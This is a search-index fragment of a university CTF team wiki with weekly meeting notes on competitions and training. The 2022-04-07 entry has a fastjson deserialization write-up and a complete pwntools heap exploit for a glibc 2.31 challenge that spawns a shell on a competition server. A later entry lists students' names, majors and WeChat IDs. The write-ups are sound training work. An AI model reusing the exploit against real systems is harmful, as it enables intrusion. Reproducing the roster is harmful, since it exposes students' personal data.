<code>alphabet</code>.</p>"},{"location":"Meeting/2022%20First%20Half/CTF%20Week%20Meeting%202022-03-24/#osintosint-no3","title":"OSINT/OSINT NO.3","text":"<p>Don't know what to find.</p> <p>The store is John &amp; the Juice New York.</p>"},{"location":"Meeting/2022%20First%20Half/CTF%20Week%20Meeting%202022-03-24/#miscwhere","title":"Misc/Where","text":"<p>Not interested in Dolpari's information.</p>"},{"location":"Meeting/2022%20First%20Half/CTF%20Week%20Meeting%202022-03-24/#miscflag","title":"Misc/flag","text":"<p>The description is to find flag in the Discord server (not the flag in channel description).</p>"},{"location":"Meeting/2022%20First%20Half/CTF%20Week%20Meeting%202022-03-24/#misc2","title":"Misc/()2","text":"<p>Similar to the (), don't know what to do.</p>"},{"location":"Meeting/2022%20First%20Half/CTF%20Week%20Meeting%202022-03-24/#line-ctf","title":"Line CTF","text":"<p>The LINE CTF is going to be an exercise competition.</p> <p>https://score.linectf.me/</p> <p>Schedule: March 26, 2022, 08:00 AM ~ March 27th, 08:00 AM (UTC+8)</p> <p>Style: Jeopardy-style (Team Cometition @ Online)</p> <p>Organizer: Security team at LINE</p> <p>Discord: https://discord.gg/4aXUwrqD3Z</p> <p>If you want to participate, please contact me.</p>"},{"location":"Meeting/2022%20First%20Half/CTF%20Week%20Meeting%202022-03-24/#note","title":"Note","text":"<ul> <li>[ ] \u5468\u516d\u8fdb\u884c\u9898\u76ee\u89e3\u9898\u7684\u5206\u4eab\u3002</li> </ul>"},{"location":"Meeting/2022%20First%20Half/CTF%20Week%20Meeting%202022-03-31/","title":"CTF Week Meeting 2022-03-31","text":"<ol> <li>Competitions schedule.</li> <li>Writeups update.</li> </ol>"},{"location":"Meeting/2022%20First%20Half/CTF%20Week%20Meeting%202022-03-31/#competitions","title":"Competitions","text":""},{"location":"Meeting/2022%20First%20Half/CTF%20Week%20Meeting%202022-03-31/#ctfshow","title":"\u611a\u4eba\u8282CTFshow\u5a31\u4e50\u8d5b","text":"<p>\u6bd4\u8d5b\u540d\u79f0\uff1a\u611a\u4eba\u8282\u6b22\u4e50\u8d5b</p> <p>\u9898\u76ee\u96be\u5ea6\uff1a\u7b80\u5355\uff0c\u6b22\u4e50\uff0c\u6076\u641e</p> <p>\u6bd4\u8d5b\u5956\u52b1\uff1a\u603b\u5206\u524d10\uff0c\u5b9a\u5236\u9f20\u6807\u57ab/\u5973\u88c5\uff0c\u4e8c\u9009\u4e00</p> <p>\u6bd4\u8d5b\u65f6\u95f4\uff1a2022\u5e744\u67081\u65e5(\u5468\u4e94) 18\u65f6\u6574</p> <p>\u6bd4\u8d5b\u65f6\u957f\uff1a24\u5c0f\u65f6</p> <p>\u6bd4\u8d5b\u5730\u5740\uff1ahttps://ctf.show/challenges</p> <p>\u6295\u7a3f\u90ae\u7bb1\uff1actfshow@163.com</p>"},{"location":"Meeting/2022%20First%20Half/CTF%20Week%20Meeting%202022-03-31/#midnight-sun-qual","title":"Midnight Sun Qual","text":"<p>https://midnightsunctf.com/</p> <p>\u661f\u671f\u516d, 02 \u56db\u6708 2022, 18:00 CST \u2014 \u661f\u671f\u65e5, 03 \u56db\u6708 2022, 18:00 CST</p> <p>8 teams from academic &amp; 8 teams from industry.</p>"},{"location":"Meeting/2022%20First%20Half/CTF%20Week%20Meeting%202022-03-31/#writeups-update","title":"Writeups update","text":"<p>\u864e\u7b26CTF WP: https://wiki.compass.college/Writeup/%E8%99%8E%E7%AC%A6CTF2022/COMPASS%20WriteUp/</p> <p>\u62db\u65b0\u8d5b WP: https://wiki.compass.college/Writeup/COMPASS%20CTF2021/COMPASS_CTF_2021_ALLwp/</p> <p>Pull request steps:</p> <ol> <li>Use markdown to write new pages.</li> <li>Modify <code>wiki/mkdocs.yml</code> to update the index.</li> </ol>"},{"location":"Meeting/2022%20First%20Half/CTF%20Week%20Meeting%202022-03-31/#dynamic-docker","title":"Dynamic docker","text":"<p>It's pity that after so many tries, I can't make the CTFd-whale work properly.</p> <ol> <li> <p>Have sent an email to BUUOJ and CTFshow to talk about the platform construction.</p> </li> <li> <p>Starting my Docker-API project to make a cloud-supported SaaS platform.</p> </li> </ol> <p>Now I've designed a docker-compose to run environments. \u62db\u65b0 challenges are working fine, other challenges are in progress.</p>"},{"location":"Meeting/2022%20First%20Half/CTF%20Week%20Meeting%202022-03-31/#note","title":"Note","text":"<ul> <li>[x] \u4e0eFrank\u8ba8\u8bbaCTFd-whale\u642d\u5efa</li> </ul>"},{"location":"Meeting/2022%20First%20Half/CTF%20Week%20Meeting%202022-04-07/","title":"CTF Week Meeting 2022-04-07","text":"<ol> <li>Guangdong Province University CTF.</li> <li>Offline schedule.</li> </ol>"},{"location":"Meeting/2022%20First%20Half/CTF%20Week%20Meeting%202022-04-07/#_1","title":"\u7b2c\u4e8c\u8282\u5e7f\u4e1c\u5927\u5b66\u751f\u7f51\u7edc\u5b89\u5168\u653b\u9632\u5927\u8d5b","text":"<ul> <li> <p>5\u670815\u65e5\u524d\uff0c\u5404\u9ad8\u6821\u9074\u9009\u53c2\u52a0\u5168\u7701\u6bd4\u8d5b\u961f\u4f0d\uff0c\u4e00\u6240\u5b66\u6821\u53ef\u6709\u591a\u7ec4\u961f\u4f0d\u53c2\u8d5b\uff1b</p> </li> <li> <p>5\u670821\u65e5\u81f322\u65e5\uff0c\u7ec4\u7ec7\u7701\u7ea7\u521d\u8d5b\u8bc4\u5ba1\uff0c\u521d\u8d5b\u5185\u5bb9\u4e3a30%\u77e5\u8bc6\u8d5b+70%\u653b\u9632\u593a\u65d7\u8d5b\uff0c\u6309\u7167\u6210\u7ee9\u9ad8\u4f4e\u53d6\u524d30\u540d\u961f\u4f0d\u8fdb\u5165\u7701\u7ea7\u603b\u51b3\u8d5b\uff0c\u6bcf\u4e2a\u9ad8\u6821\u664b\u7ea7\u961f\u4f0d\u4e0d\u8d85\u8fc72\u4e2a\uff1b</p> </li> <li> <p>\u62a5\u540d\u65f6\u95f4\uff1a\u622a\u6b62\u81f32022\u5e745\u670815\u65e5\uff08\u661f\u671f\u65e5\uff0917:00\u3002</p> </li> <li> <p>\u62a5\u540d\u65b9\u5f0f\uff1a\u53c2\u8d5b\u5b66\u6821\u586b\u5199\u76f8\u5173\u62a5\u540d\u8868\uff0c\u5c06\u7701\u7ea7\u521d\u8d5b\u62a5\u540d\u8868\uff08\u9644\u4ef63\uff09\u53d1\u81f3\u6307\u5b9a\u90ae\u7bb1tw@hzu.edu.cn\uff1b\u540c\u65f6\uff0c\u52a0\u5165\u8d5b\u4e8b\u54a8\u8be2QQ\u7fa4825405920\u3002</p> </li> </ul> <p>The sign-up would be collected and submitted once.</p> <p>According to the previous event, there are some problems:</p> <ul> <li>\u521d\u8d5b\u73af\u5883\u8001\u662f\u70b8\uff0c\u6700\u540e30\u591a\u5206\u949f\u90fd\u70b8\u4e86\uff0c\u7b54\u6848\u90fd\u63d0\u4ea4\u4e0d\u4e86</li> <li>\u664b\u7ea7\u585e\uff0c\uff0c\u9898\u76ee\u4e5f\u5076\u5c14\u4f1a\u51fa\u73b0\u65ad\u5f00\u7684\u95ee\u9898\uff0c\uff0c\u7b2c\u4e8c\u4e2aweb\u9898\uff0c\uff0c\u7adf\u7136\u4e00\u5f00\u59cb\u76f4\u63a5\u8fd4\u56de\u7a7a\uff0c\u540e\u6765\u53c8\u53ef\u4ee5\u4e86\uff1f\uff1f\u4e0d\u77e5\u9053\u662f\u4e0d\u662f\u53ea\u6709\u6211\u9047\u5230\u8fd9\u4e2a\u95ee\u9898\uff0c\uff0c\u6655</li> <li>\u800c\u4e14\uff0c\uff0c\u664b\u7ea7\u8d5b\u7adf\u7136\u4e0d\u662fuuid\u5f0f\u52a8\u6001flag\u3002\u3002\u3002\u3002\uff1f</li> </ul> <p>(From https://tari.moe/2021/05/23/2021gd-university-ctf/)</p>"},{"location":"Meeting/2022%20First%20Half/CTF%20Week%20Meeting%202022-04-07/#old","title":"old","text":"<p>\u4efb\u610f\u6587\u4ef6\u8bfb\u53d6\uff0c\u4e0d\u8fc7<code>flag.txt</code> \u8bfb\u4e0d\u4e86\uff0c\u4f46\u53ef\u4ee5\u770b <code>hint.txt</code>\uff0c<code>smali</code> \u5b57\u8282\u7801\uff0c\u63d0\u793a\u4e86 <code>fastjson 1.2.24</code></p> <p></p> <p>\u5148\u8bfb\u53d6\u672c\u8fdb\u7a0b\u76f8\u5173\u76ee\u5f55</p> <p></p> <p>\u5728 <code>/usr/local/run/start.jar</code> \u83b7\u53d6\u6e90\u7801\uff0c<code>IDEA</code>\u6253\u5f00\u5206\u6790</p> <p></p> <p>\u539f\u6765\u8fc7\u6ee4\u4e86 <code>flag</code> \uff0c\u602a\u4e0d\u5f97\u8bfb\u53d6\u4e0d\u4e86</p> <p>\u5f80\u53cd\u5e8f\u5217\u5316\u65b9\u5411\uff0c\u4e0d\u8fc7\u6709<code>waf</code></p> <p></p> <p>\u7136\u540e\u8fd8\u6709\u9650\u5236</p> <p></p> <p>\u8fd9\u91cc\u5361\u4e86\u633a\u4e45\uff0c\u8bd5\u4e86\u7f51\u4e0a\u5f88\u591aEXP\uff0c\u90fd\u4e0d\u884c</p> <p>\u7136\u540e\u7a81\u7136\u60f3\u8d77fastjson\u53cd\u5e8f\u5217\u5316\u7684\u539f\u7406</p> <p>\u4e00\u822c\u662f\u9700\u8981\u522b\u7684\u5e93\u7684\u914d\u5408\uff0c\u901a\u8fc7\u53cd\u5c04\u83b7\u53d6\u76f8\u5173\u65b9\u6cd5\u7684</p> <p>\u4e8e\u662f\u6211\u4e00\u4e2a\u4e2a\u4f9d\u8d56\u627e</p> <p></p> <p>\u641c\u4e86\u4e0b spring \uff0c\u6ca1\u6709\u76f8\u5173\u6f0f\u6d1e\uff0c\u4f46\u662f\u5728 <code>tomcat dbcp</code> \u91cc\u521a\u597d\u53d1\u73b0\u4e86\u53ef\u4ee5\u5229\u7528\uff0c\u800c\u4e14\u4e0d\u7528\u5229\u7528 <code>rmi ldap</code> \u4e4b\u7c7b\u7684</p> <p>https://kingx.me/Exploit-FastJson-Without-Reverse-Connect.html</p> <p>\u7136\u540e\u521a\u597d\u7528\u5230 <code>BCEL</code>\uff0cHFCTF2021\u4e5f\u521a\u597d\u7528\u5230\uff0c \u521a\u597d\u590d\u73b0\u8fc7\u4e86\uff0c\u6240\u4ee5\u975e\u5e38\u719f\u7ec3 \uff08</p> <p>https://github.com/f1tz/BCELCodeman</p> <p>\u7f16\u5199 <code>java poc</code>\uff0c\u8f6c\u6362\u4e3a <code>class</code> \u7136\u540e\u751f\u6210 <code>BCEL</code> \u7801</p> <p>\u8fd9\u6837\u53ef\u4ee5<code>\u7ed5\u8fc7waf\u7684\u9ed1\u540d\u5355</code>\uff0c\u5373\u7ed5\u8fc7\u4e86\u7b2c1\u4e2a<code>challenge</code></p> <p>\u8fd8\u67092\u4e2a <code>challenge</code>\uff0c\u8fd9\u4e2a\u7b80\u5355\uff0c\u5c31\u957f\u5ea6\u5927\u4e8e<code>2000</code>\uff0c\u7136\u540e\u9700\u8981\u5305\u542b <code>flag</code> \u5173\u952e\u5b57</p> <p>\u8fd9\u91cc\u76f4\u63a5\u628a <code>/flag.txt</code>\u6539\u4e00\u4e0b\u540d\u8bfb\u53d6\u5373\u53ef</p> <p></p> <p></p>"},{"location":"Meeting/2022%20First%20Half/CTF%20Week%20Meeting%202022-04-07/#babynote","title":"BabyNote","text":"<p>\u9898\u76ee\u662f\u57fa\u4e8e glibc 2.31 \u7684\u83dc\u5355\u5806\u9898\u3002</p> <p>\u6f0f\u6d1e\u51fa\u73b0\u5728 free \u4e4b\u540e\u6ca1\u6709\u7f6e\u96f6\u6307\u9488\u5bfc\u81f4\u7684 UAF \uff1a</p> <p></p> <p>\u7a0b\u5e8f\u6ca1\u6709\u8f93\u51fa\u51fd\u6570\uff0c\u5012\u662f\u6709\u4e00\u4e2a\u63d0\u793a\u7684\u51fd\u6570 gift \u51fd\u6570\uff0c\u8f93\u51fa\u5806\u5730\u5740\u6700\u4f4e\u4e24\u4e2a\u5b57\u8282\uff0c\u6ca1\u7528\u660e\u767d\uff0c\u5230\u6700\u540e\u4e5f\u4e0d\u5173\u4ed6\u7684\u4e8b\u60c5\u3002</p> <p>\u601d\u8def\uff1a</p> <ol> <li>\u5229\u7528 tcache double \u548c scanf \u8f93\u51fa\u957f\u5b57\u7b26\u4e32\u89e6\u53d1 malloc_consolidate \u83b7\u53d6 main_arena \u5730\u5740</li> <li>\u7206\u7834\u5012\u6570\u7b2c\u56db\u4e2a\u6570\u5b57\uff0c\u5c06\u5806\u5206\u914d\u5230 stdout \u7ed3\u6784\u4f53\u4e0a\uff0c\u4fee\u6539 flag \u548c write_base \u5730\u5740\u6cc4\u9732\u51fa libc \u5730\u5740</li> <li>\u5229\u7528 tcache dup get shell</li> </ol> <p>\u9047\u5230\u7684\u95ee\u9898\u5c31\u662f\u76f4\u63a5\u4e4b\u524d libc 2.23 \u7684 payload \u53bb\u6253\u7684\u8bdd\u6ca1\u6709\u56de\u663e\u51fa libc \u5730\u5740\uff0c\u539f\u6765\u7684 payload \uff1a</p> <pre><code>p64(0x0FBAD1887) +p64(0)*3 + p8(0x88)\n1\n</code></pre> <p>flag \u8fd9\u4e48\u8bbe\u7f6e\u7ed5\u8fc7\u68c0\u67e5\u6ca1\u6709\u95ee\u9898\uff0c\u95ee\u9898\u662f\u5c06 write_base \u6700\u4f4e\u503c\u5b57\u8282\u4fee\u6539\u4e3a 0x88 \u4e86\uff0c\u800c libc 2.31 \u4e2d write_ptr \u6700\u4f4e\u4f4d\u662f 0x23</p> <p></p> <p>\u5bfc\u81f4\u8d77\u59cb\u5730\u5740\u6bd4\u7ed3\u675f\u5730\u5740\u5927\uff0c\u800c\u6ca1\u6709\u4e1c\u897f\u8f93\u51fa\u3002\u8fd8\u6709\u5c31\u662f\u8c03\u8bd5\u65ad\u70b9\u4f4d\u7f6e\u8bbe\u7f6e\u95ee\u9898 \uff0c\u5bfc\u81f4\u4e00\u76f4\u4ee5\u4e3a\u662f\u4fee\u6539\u4e0d\u6210\u529f\u7684\u539f\u56e0\u3002\u65ad\u70b9\u4e00\u5f00\u59cb\u662f\u6253\u5728\u4fee\u6539\u540e\u4e0b\u4e00\u6b21\u8fdb\u5165\u4e3b\u83dc\u5355\u7684\u65f6\u5019\uff0c\u7531\u4e8e\u6bcf\u6b21\u8f93\u51fa\u90fd\u4f1a\u5237\u65b0 stdout \u7ed3\u6784\u4f53\u90e8\u5206\u6307\u9488\uff0c\u5bfc\u81f4\u4e00\u76f4\u4ee5\u4e3a\u6ca1\u4fee\u6539\u6210\u529f\u3002\u6b63\u786e\u5e94\u8be5\u5728 read \u6253\u65ad\u70b9\uff0c\u7136\u540e n \u8df3\u4e00\u6b65\u67e5\u770b\u662f\u5426\u6210\u529f\u4fee\u6539\u7ed3\u6784\u4f53\u3002</p>"},{"location":"Meeting/2022%20First%20Half/CTF%20Week%20Meeting%202022-04-07/#exp","title":"EXP","text":"<pre><code>from pwn import *\n# context.log_level = 'debug'\ncontext.terminal = ['tmux','sp','-h']\n\n\n\ndef add(content):\n    p.sendlineafter(\"&gt;&gt;&gt; \",str(1))\n    p.sendafter(\"Input Content:\\n\",content)\ndef gift():\n    p.sendlineafter(\"&gt;&gt;&gt; \",str(666))\ndef delete(id):\n    p.sendlineafter(\"&gt;&gt;&gt; \",str(3))\n    p.sendlineafter(\"Input ID:\\n\",str(id))\ndef edit(id,content):\n    p.sendlineafter(\"&gt;&gt;&gt; \",str(2))\n    p.sendlineafter(\"Input ID:\\n\",str(id))\n    p.sendafter(\"Input Content:\\n\",content)\n\ndef exp():\n    add('a'*58)#0\n    add('a'*58)#1\n    add('a'*58)#2\n    for _ in range(8):\n        delete(0)\n        edit(0,'b'*0x58)\n    edit(0,'\\x00'*0x10)\n    p.sendlineafter(\"&gt;&gt;&gt; \",'1'*0x450)\n    edit(0,'\\xa0\\x66')\n\n    stdout_offset = libc.symbols['_IO_2_1_stdout_']\n    log.info(\"stdout_offset:\"+hex(stdout_offset))\n\n    add('c'*0x8)#3\n    # gdb.attach(p,\"b *$rebase(0x1392)\")\n    # raw_input()\n    add(p64(0x0FBAD1887) +p64(0)*3 + p8(0x00))#4\n    libc_addr = u64(p.recvuntil('\\x7f',timeout=1)[-6:].ljust(8,'\\x00'))-(0x7fbe678e5980-0x7fbe676fa000)#- (0x7ffff7fac980-0x7ffff7dc1000)\n    log.info(\"libc_addr:\"+hex(libc_addr))\n\n    free_hook = libc_addr+libc.sym['__free_hook']\n    system_addr = libc_addr+libc.sym['system']\n    binsh_str = libc_addr+libc.search('/bin/sh').next()\n\n    delete(1)\n    edit(1,p64(free_hook)*2)\n    add('/bin/sh\\x00')\n    add(p64(system_addr))\n    delete(1)\n\n    p.interactive()\n\n\n# p = process(\"./BabyNote\",env={'LD_PRELOAD':'./libc-2.31.so'})\n# libc = ELF(\"./libc-2.31.so\")\n# exp()\n\nif __name__ == '__main__':\n    # p = process(\"./BabyNote\",env={'LD_PRELOAD':'./libc-2.31.so'})\n    # libc = ELF(\"./libc-2.31.so\")\n    # p = process(\"./BabyNote\")\n    # libc = ELF(\"/lib/x86_64-linux-gnu/libc.so.6\")\n    p = remote(\"8.134.14.168\", 10000)\n    libc = ELF(\"./libc-2.31.so\")\n    while True:\n        try:\n            exp()\n            exit(0)\n        except:\n            p.close()\n            p = remote(\"8.134.14.168\", 10000)\n            # p = process(\"./BabyNote\",env={'LD_PRELOAD':'./libc-2.31.so'})\n123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172\n</code></pre>"},{"location":"Meeting/2022%20First%20Half/CTF%20Week%20Meeting%202022-04-07/#offline-activity-schedule","title":"Offline Activity Schedule","text":"<p>We have returned to the campus yesterday.</p> <p>Looking forward to our offline activity.</p> <ul> <li>We are going to use the expert-beginner cooperating method.</li> <li>The training competition would be more serious.</li> <li>CTF platform would collect self-designed challenges and closed competition challenges.</li> <li>Some competition schedules would be replaced with AWD competition.</li> </ul>"},{"location":"Meeting/2022%20First%20Half/CTF%20Week%20Meeting%202022-04-07/#note","title":"Note","text":"<ul> <li>[ ] \u7b2c\u4e00\u5c4a\u9898\u76ee\u641c\u96c6\u53d1\u5e03</li> </ul>"},{"location":"Meeting/2022%20First%20Half/CTF%20Week%20Meeting%202022-04-14/","title":"CTF Week Meeting 2022-04-14","text":"<ol> <li>Guangdong Province University CTF.</li> <li>PWN challenge training.</li> <li>Upcoming competitions.</li> </ol>"},{"location":"Meeting/2022%20First%20Half/CTF%20Week%20Meeting%202022-04-14/#_1","title":"\u7b2c\u4e8c\u8282\u5e7f\u4e1c\u5927\u5b66\u751f\u7f51\u7edc\u5b89\u5168\u653b\u9632\u5927\u8d5b","text":"<p>Now we have 2 teams ready, 1 member to set up the third team.</p> \u6234\u9a8f\u98de \u4e34\u5e8a\u533b\u5b66 \u5927\u4e8c \u7537 \u961f\u957f wxid_jxwdutfinu3b21 \u4ee3\u9b4f\u7ade \u7269\u7406\u5b66 \u5927\u4e8c \u7537 \u6210\u5458 assassin_dou \u5218\u5b50\u7fbd \u901a\u8bc6\u901a\u4fee \u5927\u4e8c \u7537 \u6210\u5458 L13768311688 \u9648\u65ed\u9633 \u901a\u8bc6\u901a\u4fee \u5927\u4e8c \u7537 \u6210\u5458 xy591557928 \u90ac\u4e00\u5e06 \u901a\u8bc6\u901a\u4fee \u5927\u4e8c \u7537 \u961f\u957f GhostFrank \u4e25\u6587\u8c26 \u901a\u8bc6\u901a\u4fee \u5927\u4e00 \u7537 \u6210\u5458 wxid_pcjl48tfa35n22 \u6731\u5609\u6960 \u8ba1\u7b97\u673a\u79d1\u5b66\u4e0e\u5de5\u7a0b \u5927\u4e8c \u7537 \u6210\u5458 GGAutomaton \u6731\u5f18 \u8ba1\u7b97\u673a\u79d1\u5b66\u4e0e\u5de5\u7a0b \u5927\u4e8c \u7537 \u6210\u5458 Trust_04zh <p>Besides, we are going to invite CRA's member to join the competition.</p>"},{"location":"Meeting/2022%20First%20Half/CTF%20Week%20Meeting%202022-04-14/#note","title":"Note","text":"<ul> <li>[ ] \u642d\u5efaSRC\u5e73\u53f0\uff0c\u4e0e\u4fe1\u606f\u4e2d\u5fc3\u5408\u4f5c</li> <li>[ ] PWN\u9898\u76ee\u63d0\u5347\u8d44\u6599\uff1aIntel\u624b\u518c\u3001GLIBC\u6e90\u7801</li> <li>[ ] \u9080\u8bf7CS315\u7684\u540c\u5b66\u53c2\u52a0\u7ade\u8d5b</li> </ul>"},{"location":"Meeting/2022%20First%20Half/CTF%20Week%20Meeting%202022-04-21/","title":"CTF Week Meeting 2022-04-21","text":"<ol> <li>Guangdong Province University CTF online talk.</li> <li>CTF toolkit.</li> <li>Upcoming competitions.</li> </ol>"},{"location":"Meeting/2022%20First%20Half/CTF%20Week%20Meeting%202022-04-21/#_1","title":"\u7b2c\u4e8c\u8282\u5e7f\u4e1c\u5927\u5b66\u751f\u7f51\u7edc\u5b89\u5168\u653b\u9632\u5927\u8d5b","text":"<p>The online talk session would be held on April 30th.</p> <p>Organizer: COMPASS CTF Team</p> <p>Co-operator: Computer Research Association</p> <p>Invitation: all the students from SUSTech</p> <p>After the talk, we would arrange 2 pieces of training (introduction).</p>"},{"location":"Meeting/2022%20First%20Half/CTF%20Week%20Meeting%202022-04-21/#ctf-toolkit","title":"CTF toolkit","text":"<p>https://wiki.compass.college/Tool/Cryptography/SageMathCell/</p> <p>The current tools are collected from every CTF challenge.</p> <p>Some challenges are using some specific tool, that isn't on the list.</p> <p>I've found the difficulty to configure every machine to work for CTF events. So, let's make a toolkit for fast establishing the environment.</p> <ul> <li>Docker image</li> <li>Kali virtual machine image</li> <li>Windows toolkit</li> <li>(Not sure) macOS toolkit</li> </ul>"},{"location":"Meeting/2022%20First%20Half/CTF%20Week%20Meeting%202022-04-21/#events","title":"Events","text":""},{"location":"Meeting/2022%20First%20Half/CTF%20Week%20Meeting%202022-04-21/#cuctf-10","title":"CUCTF 1.0","text":"<p>\u661f\u671f\u516d, 23 \u56db\u6708 2022, 14:30 CST \u2014 \u661f\u671f\u516d, 23 \u56db\u6708 2022, 20:30 CST</p> <p>https://ctftime.org/event/1635</p> <p>CUCTF 1.0 is First Edition of CUCTF from CUCYSEC Club. This CTF will be in collaboration of WIZCON '22 which aims to introduce beginners to Capture the Flags.</p> <p>Link: http://ctf.teamsanitizer.me:2052/</p>"},{"location":"Meeting/2022%20First%20Half/CTF%20Week%20Meeting%202022-04-21/#note","title":"Note","text":"<ul> <li>[ ] \u5206\u4eab\u9080\u8bf7\u4f1a\u6d77\u62a5\u4e0e\u5ba3\u4f20</li> <li>[ ] \u5148\u5b8c\u6210\u524d\u4e24\u652f\u961f\u4f0d\u7684\u62a5\u540d</li> </ul>"},{"location":"Meeting/2022%20First%20Half/CTF%20Week%20Meeting%202022-04-28/","title":"CTF Week Meeting 2022-04-28","text":"<ol> <li>Guangdong Province University CTF online talk.</li> <li>Guide book progress.</li> <li>Offline activities re-schedule.</li> </ol>"},{"location":"Meeting/2022%20First%20Half/CTF%20Week%20Meeting%202022-04-28/#_1","title":"\u7b2c\u4e8c\u5c4a\u5e7f\u4e1c\u5927\u5b66\u751f\u7f51\u7edc\u5b89\u5168\u653b\u9632\u5927\u8d5b","text":"<p>The online talk session would be held on April 30th.</p> <p>Organizer: COMPASS CTF Team</p> <p>Co-operator: Computer Research Association</p> <p>Invitation: all the students from SUSTech</p> <p>After the talk, we would arrange 2 pieces of training (introduction).</p> <p></p> <ol> <li>Online talk: https://meeting.tencent.com/p/4484894504</li> <li>Training activities: May 7th, May 14th.</li> <li>Competition time: May 21st-22nd.</li> </ol>"},{"location":"Meeting/2022%20First%20Half/CTF%20Week%20Meeting%202022-04-28/#guide-book","title":"Guide Book","text":"<p> <p>Under the thought of this aspect of the difficult, I want to introduce those things you won't know when first solved some challenges. Each chapter of the book would start with some practice knowledge, and end with some difficult advanced principles. The whole book would be divided into two parts: basics knowledge that you can learn from simply reading and learning some limited necessary knowledge, and the hard part that you need to read more about the principle, source code, and the details of the techniques.</p> <p>The volume I is under writing.</p> <p>Volume I:</p> <p>Chapter 1: introduction to the CTF</p> <p>Introduction guidance to the competitions, challenges, and the format of the different CTF events. I will talk about the different styles of the CTF, different areas of the CTF, and some of the key attitudes of the CTF. This chapter won't have any technical details about the CTF, but you will learn about the philosophy of the game and the different goals of the events.</p> <p>Chapter 2: information gathering</p> <p>The information quantity is so large that most of the time, you may struggle with searching everywhere and get nothing. From searching for the correct knowledge to solve your current faced problems to the sensitive information gathering for the specific organizations, we want to find useful information out of the ocean of garbage information. Information gathering is the basic skill you should master.</p> <p>Chapter 3: OSINT and sensitive information exposure</p> <p>...</p>"},{"location":"Meeting/2022%20First%20Half/CTF%20Week%20Meeting%202022-04-28/#offline-activities","title":"Offline Activities","text":"<p>Talked with Frankss.</p> <p>The current campus team still needs more members.</p> <p>For every student, we might have 1 - 2 years working in the CTF competitions, and we need to award prizes.</p> <p>The past half year is highly affected by the COVID-19, and we are learning online (mostly, by ourselves). In the last 5 weeks of this semester, I want to form some offline activities as the last year.</p> <p>The offline training would have longer time (longer than the past 4 hour training), and we would have weekly challenges (highly encouraged to finish).</p> <p>Besides, the team would have 2 types of members: active and retired. We want to have a clear list of students who still active to participate competitions.</p>"},{"location":"Meeting/2022%20First%20Half/CTF%20Week%20Meeting%202022-04-28/#note","title":"Note","text":"<ul> <li>[x] \u5206\u4eab\u9080\u8bf7\u4f1a\u6d77\u62a5\u4e0e\u5ba3\u4f20</li> <li>[x] \u5148\u5b8c\u6210\u524d\u4e24\u652f\u961f\u4f0d\u7684\u62a5\u540d</li> </ul>"},{"location":"Meeting/2022%20First%20Half/CTF%20Week%20Meeting%202022-05-05/","title":"CTF Week Meeting 2022-05-05","text":"<ol> <li>Weekly meeting has been skipped.</li> <li>Upcoming training and challenges.</li> <li>Competition sign up form.</li> </ol>"},{"location":"Meeting/2022%20First%20Half/CTF%20Week%20Meeting%202022-05-05/#training","title":"Training","text":"<p>Before the training, members should finish the challenges.</p> <p>Before the afternoon, we would have talk and lectures.</p> <p>After the afternoon, we sync the challenges together, and do some competition challenges.</p> <p>If we have competitions, the training time may be adjusted.</p>"},{"location":"Meeting/2022%20First%20Half/CTF%20Week%20Meeting%202022-05-05/#the-sign-up-form","title":"The sign up form","text":"<p>Please fill the form before May, 9th.</p>"},{"location":"Meeting/2022%20First%20Half/CTF%20Week%20Meeting%202022-05-13/","title":"CTF Week Meeting 2022-05-13","text":"<ol> <li>The past training and the competition sign up.</li> <li>The following training needs some challenges.</li> <li>Recent and upcoming events.</li> </ol>"},{"location":"Meeting/2022%20First%20Half/CTF%20Week%20Meeting%202022-05-13/#the-past-training","title":"The past training","text":"<p>The training material would be posted on the website.</p> <p>In the past training, we have discussed some basic ideas about the CTF challenge. Now, our new participants have learned about easy knowledge. All the discussions are simple.</p> <p>We have several teams signed up for the upcoming competition.</p> <p>The 2nd Guangdong Province University CTF Event would end sign up on May, 15th. From new participants, the new teams are:</p> <ul> <li>Na1ve team (the sign-up form hasn't been submitted, would be summited soon)</li> <li>Leo_Adventure team</li> <li>Long, Cheng team (from Mathematics department)</li> <li>Mumu team</li> <li>W3r3w\u03b81f Ki11 team</li> <li>rm  -rf /* team</li> </ul> <p>Along with the previous teams, we have 9 teams in total. The 9 teams contain 2 advanced teams (from COMPASS CTF) and 7 fan teams.</p>"},{"location":"Meeting/2022%20First%20Half/CTF%20Week%20Meeting%202022-05-13/#the-following-training","title":"The following training","text":"<p>The training this week would be held tomorrow (May, 14th) in the 551 Room, Southern Tower of the Engineering Department. Now, I have arranged some weekly training challenges, but still we need some materials.</p> <p>The lecture part includes Web &amp; PWN &amp; RE part analysis and the difficult challenges. According to my area, I don't have enough experience in Misc and Forensics aspects.</p> <p>Hoping you can help with the upcoming training.</p>"},{"location":"Meeting/2022%20First%20Half/CTF%20Week%20Meeting%202022-05-13/#events","title":"Events","text":"<p>DEF CON 30 is upcoming. The qualification round of DEF CON would be held on May, 28th - 29th.</p> <p>https://defcon.org/index.html</p> <p>\u7b2c\u5341\u4e94\u5c4a\u5168\u56fd\u5927\u5b66\u751f\u4fe1\u606f\u5b89\u5168\u7ade\u8d5b-\u521b\u65b0\u5b9e\u8df5\u80fd\u529b\u8d5b</p> <p>https://maka.im/pcviewer/602244610/6822NHAOW602244610</p> <p>http://www.ciscn.cn/competition/securityCompetition?compet_id=36</p> <p>Sign up before May, 20th. The online qualification round on May 28th - 29th.</p> <p>\u7b2c\u5341\u4e94\u5c4a\u5168\u56fd\u5927\u5b66\u751f\u4fe1\u606f\u5b89\u5168\u7ade\u8d5b-\u4f5c\u54c1\u8d5b</p> <p>http://www.ciscn.cn/competition/securityCompetition?compet_id=35</p> <p>CTFshow \u5355\u8eab\u676f</p> <p>https://ctf.show/challenges</p> <p>2022-05-20 18:00 ~ 2022-05-22 18:00</p>"},{"location":"Meeting/2022%20First%20Half/CTF%20Week%20Meeting%202022-05-13/#note","title":"Note","text":"<ul> <li>[ ] \u5468\u672b\u8bad\u7ec3\u7684\u65f6\u95f4\u65e5\u7a0b\u5b89\u6392</li> </ul>"},{"location":"Meeting/2022%20First%20Half/CTF%20Week%20Meeting%202022-05-19/","title":"CTF Week Meeting 2022-05-19","text":"<ol> <li>The competition signs up and forms submit.</li> <li>Rules and the qualifier round notes.</li> <li>Upcoming competitions.</li> </ol>"},{"location":"Meeting/2022%20First%20Half/CTF%20Week%20Meeting%202022-05-19/#register","title":"Register","text":"<p>All the competition materials have been submitted.</p> <p>Online submission:</p> <p>https://datacon.qianxin.com/competitions/25/introduction</p> <p>Choose one of the 2 competitions and submit online team information.</p> 